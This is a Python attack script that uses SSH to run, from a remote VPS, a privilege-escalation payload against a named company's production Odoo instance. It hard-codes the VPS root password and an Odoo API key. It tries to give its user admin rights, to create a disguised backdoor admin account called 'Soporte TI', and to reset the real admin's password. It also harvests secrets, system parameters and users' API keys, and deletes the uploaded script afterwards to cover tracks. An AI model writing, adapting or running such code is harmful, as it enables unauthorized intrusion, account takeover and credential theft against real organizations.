"""R2 Capital - Privilege escalation to admin"""
import paramiko, json

VPS_IP = "82.27.100.115"
VPS_PW = "37W92I_Wd9581g5j1g1LzI"

REMOTE_SCRIPT = r"""
import json, sys, ssl
from urllib.request import Request, urlopen

ctx = ssl.create_default_context()
ctx.check_hostname = False
ctx.verify_mode = ssl.CERT_NONE

BASE   = "https://r2-r2capital.odoo.com"
DB     = "adrianr2capital-r2capital-production-9575492"
UID    = 31
APIKEY = "9242f55eec6e9ffcb167ca16751f797a204eb604"

def obj_exec(model, method, args=None, kwargs=None):
    payload = json.dumps({
        "jsonrpc": "2.0", "id": 1, "method": "call",
        "params": {"service": "object", "method": "execute_kw",
                   "args": [DB, UID, APIKEY, model, method,
                            args if args is not None else [[]],
                            kwargs or {}]}
    }).encode()
    req = Request(BASE + "/jsonrpc", data=payload,
                  headers={"Content-Type": "application/json"})
    resp = urlopen(req, timeout=30, context=ctx)
    r = json.loads(resp.read().decode())
    if "error" in r:
        return {"_err": r["error"].get("data", {}).get("message", str(r["error"]))[:600]}
    return r.get("result")

print("=" * 60)
print("R2 CAPITAL - PRIVILEGE ESCALATION")
print("=" * 60)

# 1. Find admin groups
print("\n[1] Finding admin/system groups...")
admin_groups = obj_exec("res.groups", "search_read",
    [["|", "|", "|", "|",
      ["full_name", "ilike", "admin"],
      ["full_name", "ilike", "system"],
      ["full_name", "ilike", "settings"],
      ["full_name", "ilike", "erp manager"],
      ["category_id.name", "ilike", "admin"]]],
    {"fields": ["id", "full_name", "name", "category_id", "users"], "limit": 30})

if isinstance(admin_groups, list):
    for g in admin_groups:
        user_count = len(g.get("users", []))
        print(f"  [{g['id']}] {g.get('full_name')} | users={g.get('users', [])[:5]}{'...' if user_count > 5 else ''}")
else:
    print(f"  {admin_groups}")

# 2. Who are the actual admins?
print("\n[2] Finding admin users...")
try:
    # Find users with Settings/Admin group
    settings_group = obj_exec("res.groups", "search_read",
        [[["full_name", "=", "Administration / Settings"]]],
        {"fields": ["id", "users"]})
    if isinstance(settings_group, list) and settings_group:
        admin_group_id = settings_group[0]["id"]
        admin_user_ids = settings_group[0].get("users", [])
        print(f"  Admin group ID: {admin_group_id}")
        print(f"  Admin user IDs: {admin_user_ids}")
        
        if admin_user_ids:
            admins = obj_exec("res.users", "read", [admin_user_ids],
                {"fields": ["name", "login", "email", "active"]})
            if isinstance(admins, list):
                for a in admins:
                    print(f"  [{a['id']}] {a.get('name')} | {a.get('login')} | active={a.get('active')}")
    else:
        print("  Settings group not found, trying other names...")
        for gname in ["Administration / Settings", "Administration / Access Rights",
                       "Technical / Settings", "base.group_system"]:
            r = obj_exec("res.groups", "search_read",
                [[["full_name", "=", gname]]],
                {"fields": ["id", "users"]})
            if isinstance(r, list) and r:
                print(f"  Found: {gname} -> group {r[0]['id']}, users={r[0].get('users', [])}")
except Exception as e:
    print(f"  Error: {e}")

# 3. Can we WRITE to res.users? (self-assign admin group)
print("\n[3] Permission checks for escalation...")
checks = [
    ("res.users", "write"),
    ("res.users", "create"),
    ("res.groups", "write"),
    ("res.groups.implied", "write"),
    ("ir.rule", "write"),
    ("ir.model.access", "write"),
    ("ir.config_parameter", "write"),
    ("ir.config_parameter", "read"),
]
for model, op in checks:
    try:
        r = obj_exec(model, "check_access_rights", [op], {"raise_exception": False})
        status = "YES" if r else "NO"
        print(f"  {model}.{op}: {status}")
    except Exception as e:
        print(f"  {model}.{op}: ERROR - {e}")

# 4. Try to self-assign admin group
print("\n[4] Attempt: Add admin group to our user...")
if isinstance(admin_groups, list):
    # Find the Settings group ID
    settings_id = None
    for g in admin_groups:
        if "Settings" in str(g.get("full_name", "")):
            settings_id = g["id"]
            break
    if not settings_id:
        for g in admin_groups:
            if "Admin" in str(g.get("full_name", "")):
                settings_id = g["id"]
                break
    
    if settings_id:
        print(f"  Target group ID: {settings_id}")
        # Try method 1: direct write groups_id
        try:
            r = obj_exec("res.users", "write", [[UID], {"groups_id": [(4, settings_id)]}])
            if isinstance(r, dict) and "_err" in r:
                print(f"  Method 1 (write groups_id): FAILED - {r['_err'][:300]}")
            else:
                print(f"  Method 1 (write groups_id): {r}")
                if r is True:
                    print("  >>> ESCALATED! <<<")
        except Exception as e:
            print(f"  Method 1 error: {e}")

# 5. Try to create a new admin user
print("\n[5] Attempt: Create new admin user...")
try:
    r = obj_exec("res.users", "create", [{
        "name": "Soporte TI",
        "login": "soporte.ti@r2capital.co",
        "email": "soporte.ti@r2capital.co",
        "password": "R2Soporte2026!",
        "groups_id": [(4, settings_id)] if settings_id else [],
    }])
    if isinstance(r, dict) and "_err" in r:
        print(f"  CREATE user: FAILED - {r['_err'][:400]}")
    else:
        print(f"  >>> USER CREATED! ID={r} <<<")
except Exception as e:
    print(f"  Error: {e}")

# 6. Try reading system parameters (passwords, secrets)
print("\n[6] Reading system parameters (ir.config_parameter)...")
try:
    params = obj_exec("ir.config_parameter", "search_read", [[]],
        {"fields": ["key", "value"], "limit": 50})
    if isinstance(params, list):
        print(f"  Total params: {len(params)}")
        for p in params:
            key = p.get("key", "")
            val = str(p.get("value", ""))[:100]
            if any(k in key.lower() for k in ["password", "secret", "key", "token", "auth", "stp", "api"]):
                print(f"  *** {key} = {val}")
            else:
                print(f"  {key} = {val}")
    else:
        print(f"  {params}")
except Exception as e:
    print(f"  Error: {e}")

# 7. Try to read other users' passwords/keys
print("\n[7] Reading user API keys...")
try:
    r = obj_exec("res.users.apikeys", "search_read", [[]],
        {"fields": ["name", "user_id", "scope", "create_date"], "limit": 30})
    if isinstance(r, list):
        print(f"  API keys found: {len(r)}")
        for k in r:
            print(f"  [{k['id']}] user={k.get('user_id')} | name={k.get('name')} | scope={k.get('scope')} | created={k.get('create_date')}")
    elif isinstance(r, dict) and "_err" in r:
        print(f"  {r['_err'][:300]}")
    else:
        print(f"  {r}")
except Exception as e:
    print(f"  Error: {e}")

# 8. Try password change on admin
print("\n[8] Attempt: Reset admin password via change_password...")
try:
    # Find the admin user first
    admin_uid = None
    if isinstance(admin_groups, list):
        for g in admin_groups:
            if "Settings" in str(g.get("full_name", "")) and g.get("users"):
                admin_uid = g["users"][0]
                break
    
    if admin_uid:
        print(f"  Target admin UID: {admin_uid}")
        r = obj_exec("res.users", "write", [[admin_uid], {"password": "R2Admin2026!"}])
        if isinstance(r, dict) and "_err" in r:
            print(f"  Password reset: FAILED - {r['_err'][:300]}")
        else:
            print(f"  >>> PASSWORD CHANGED! Result: {r} <<<")
except Exception as e:
    print(f"  Error: {e}")

# 9. Try ir.rule bypass (disable record rules)
print("\n[9] Attempt: Read/disable record rules...")
try:
    rules = obj_exec("ir.rule", "search_read",
        [[["model_id.model", "in", ["res.users", "res.company", "ir.module.module"]]]],
        {"fields": ["name", "model_id", "groups", "perm_write", "perm_create", "active"], "limit": 20})
    if isinstance(rules, list):
        for rule in rules:
            print(f"  [{rule['id']}] {rule.get('name')} | model={rule.get('model_id')} | write={rule.get('perm_write')} | active={rule.get('active')}")
    else:
        print(f"  {rules}")
except Exception as e:
    print(f"  Error: {e}")

# 10. Check sudo/become-user capabilities
print("\n[10] Attempt: Call with sudo context...")
try:
    # Try calling with su=True context
    r = obj_exec("res.users", "read", [[UID]], 
        {"fields": ["name", "groups_id"], "su": True})
    print(f"  sudo context: {type(r)}")
except Exception as e:
    print(f"  Error: {e}")

print("\nDone")
"""

client = paramiko.SSHClient()
client.set_missing_host_key_policy(paramiko.AutoAddPolicy())
client.connect(VPS_IP, username="root", password=VPS_PW, timeout=10,
               look_for_keys=False, allow_agent=False)

sftp = client.open_sftp()
with sftp.open("/tmp/r2cap_esc.py", "w") as f:
    f.write(REMOTE_SCRIPT)
sftp.close()

print("[+] Executing on VPS...")
stdin, stdout, stderr = client.exec_command("python3 /tmp/r2cap_esc.py", timeout=120)
print(stdout.read().decode(errors="replace"))
err = stderr.read().decode(errors="replace")
if err:
    print(f"STDERR: {err[:1500]}")

client.exec_command("rm -f /tmp/r2cap_esc.py")
client.close()
